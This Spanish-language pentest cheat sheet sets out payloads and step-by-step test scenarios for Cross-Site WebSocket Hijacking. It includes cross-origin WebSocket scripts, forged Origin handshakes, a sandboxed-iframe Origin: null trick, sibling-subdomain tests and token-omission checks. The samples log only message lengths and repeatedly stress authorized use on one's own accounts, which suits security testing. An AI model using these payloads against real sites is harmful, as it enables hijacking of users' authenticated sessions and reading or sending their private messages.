# 🗡️ Cross-Site WebSocket Hijacking: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Conexión cruzada de navegador

```js
const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onopen=()=>console.log('abierto');ws.onmessage=e=>console.log('longitud',e.data.length)
const ws2=new WebSocket('wss://{ORIGEN}/chat');ws2.onmessage=e=>console.log('tipo',typeof e.data)
```

**Cuándo usarlo:** Ejecutar desde una página controlada. El navegador fija Origin; 101/abierto no prueban datos privados ni cookie enviada.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).


## 🧭 Payloads por contexto

### Handshake con Origin propio y externo

```http
GET /ws HTTP/1.1
Host: {ORIGEN}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://{ORIGEN}
Cookie: session={COOKIE_PROPIA}

GET /ws HTTP/1.1
Host: {ORIGEN}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://{HOST_CONTROLADO}
Cookie: session={COOKIE_PROPIA}
```

**Cuándo usarlo:** Requests independientes para Repeater. Un cliente HTTP falsifica Origin; después reproducir en navegador y revisar SameSite/token.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).


### Dominio hermano y origen opaco

```html
<script>const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onmessage=e=>console.log(e.data.length)</script>
<iframe sandbox="allow-scripts" srcdoc="<script>const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onopen=()=>console.log('abierto')</script>"></iframe>
```

**Cuándo usarlo:** La primera línea se aloja en un subdominio propio same-site; la segunda produce Origin: null. Probar una alternativa a la vez y confirmar cookies.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).


## 🔥 Payloads avanzados

### Lectura y escritura limitadas

```js
const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onmessage=e=>console.log('bytes propios',e.data.length)
const ws2=new WebSocket('wss://{ORIGEN}/ws');ws2.onopen=()=>ws2.send(JSON.stringify({message:'ws-canary-123'}))
const ws3=new WebSocket('wss://{ORIGEN}/ws');ws3.onopen=()=>ws3.send(JSON.stringify({type:'history',objectId:'{ID_PROPIO}'}))
```

**Cuándo usarlo:** Adaptar el esquema a mensajes observados; usar solo chat/objeto propio y verificar estado con segunda cuenta controlada. No registrar contenido privado completo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/websockets).


### Tramas binarias y token de handshake

```js
const ws=new WebSocket('wss://{ORIGEN}/ws');ws.binaryType='arraybuffer';ws.onmessage=e=>console.log(e.data instanceof ArrayBuffer?e.data.byteLength:e.data.length)
const ws2=new WebSocket('wss://{ORIGEN}/ws?csrf={TOKEN_PROPIO}');ws2.onopen=()=>console.log('token aceptado')
```

**Cuándo usarlo:** La primera prueba mide tramas binarias propias. La segunda es control positivo: comparar con token omitido/incorrecto sin exponer tokens de terceros.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).


## 🔬 Pruebas guiadas por escenario

### 1. Handshake legítimo de control

**Objetivo:** Registrar el Upgrade normal de una cuenta propia.

```http
GET /ws HTTP/1.1
Host: {ORIGEN}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://{ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** El 101 demuestra upgrade, pero no datos accesibles ni fallo de Origin.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 2. Origin externo en handshake

**Objetivo:** Comparar el mismo canal con origen externo controlado.

```http
GET /ws HTTP/1.1
Host: {ORIGEN}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://{CONTROLLED_HOST}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Un cliente HTTP puede falsificar Origin; confirmar desde navegador que la cookie se envía y hay mensajes privados.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 3. Conexión cruzada real

**Objetivo:** Abrir WebSocket desde una página propia fuera del origen objetivo.

```js
const ws=new WebSocket('wss://{ORIGEN}/ws'); ws.onopen=()=>console.log('abierto'); ws.onmessage=e=>console.log('mensaje',e.data.length);
```

**Interpretación:** El navegador fija Origin y aplica cookies; observar solo metadatos de mensajes de la cuenta de prueba.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 4. Handshake sin cookie

**Objetivo:** Distinguir canal público de canal autenticado.

```http
GET /ws HTTP/1.1
Host: {ORIGEN}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://{CONTROLLED_HOST}
```

**Interpretación:** Comparar con sesión propia; un 101 público sin mensajes sensibles no confirma CSWSH.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 5. Token de handshake omitido

**Objetivo:** Verificar si el canal depende solo de cookie.

```text
wss://{ORIGEN}/ws?csrf=      -> comparar con wss://{ORIGEN}/ws?csrf={TOKEN_PROPIO}
```

**Interpretación:** Si un token impredecible es obligatorio, una página externa normalmente no podrá iniciar el canal autenticado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 6. Mensaje de consulta propio

**Objetivo:** Comprobar qué datos permite leer el canal cruzado.

```js
ws.onopen=()=>ws.send(JSON.stringify({type:'history',objectId:'{ID_PROPIO}'})); ws.onmessage=e=>console.log(e.data.length);
```

**Interpretación:** Adaptar esquema al tráfico real. Solo un dato privado propio legible desde el origen externo demuestra impacto.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 7. Mensaje hacia segundo objeto propio

**Objetivo:** Verificar autorización por objeto además de la del handshake.

```json
{"type":"history","objectId":"{ID_CONTROLADO_B}"}
```

**Interpretación:** Enviar con sesión A y objeto B, ambos controlados. Un fallo por objeto es distinto del CSWSH y debe separarse.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Sockets/README.md).

### 8. Recepción pasiva de eventos

**Objetivo:** Comprobar si un canal cruzado revela notificaciones sin enviar mensajes.

```js
const ws=new WebSocket('wss://{ORIGEN}/ws'); ws.onmessage=e=>console.log('bytes',e.data.length);
```

**Interpretación:** Generar un evento inocuo desde otra cuenta propia; registrar solo longitud y marcador, no mensajes ajenos.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 9. Origin null desde iframe sandbox

**Objetivo:** Abrir el canal desde un documento de origen opaco controlado.

```html
<iframe sandbox="allow-scripts" srcdoc="<script>const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onopen=()=>parent.postMessage('ws-abierto','*')</script>"></iframe>
```

**Interpretación:** El navegador enviará Origin: null; comprobar cookies y datos de cuenta propia. Un 101 aislado no confirma CSWSH.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 10. Emisor en dominio hermano

**Objetivo:** Servir la página de prueba en un subdominio propio del mismo site para evaluar cookies SameSite=Strict.

```js
const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onmessage=e=>console.log('bytes',e.data.length);
```

**Interpretación:** Ejecutar desde https://{SUBDOMINIO_CONTROLADO}.{ORIGEN}. Verificar Origin distinto, cookie enviada y mensaje privado propio.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain).

### 11. Acción propia por mensaje cruzado

**Objetivo:** Tras confirmar el canal cruzado, enviar solo un mensaje reversible según el esquema observado.

```js
const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onopen=()=>ws.send(JSON.stringify({message:'prueba-123'}));
```

**Interpretación:** Adaptar la estructura al tráfico real y verificar en otra cuenta propia; abrir el socket no prueba capacidad de escritura.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 12. Trama binaria recibida

**Objetivo:** Inspeccionar canales que envían ArrayBuffer en lugar de texto.

```js
const ws=new WebSocket('wss://{ORIGEN}/ws');ws.binaryType='arraybuffer';ws.onmessage=e=>console.log(e.data instanceof ArrayBuffer?e.data.byteLength:e.data.length);
```

**Interpretación:** Registrar solo tamaño de tramas propias; el formato binario puede ocultar datos a un monitor que solo mide string.length.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
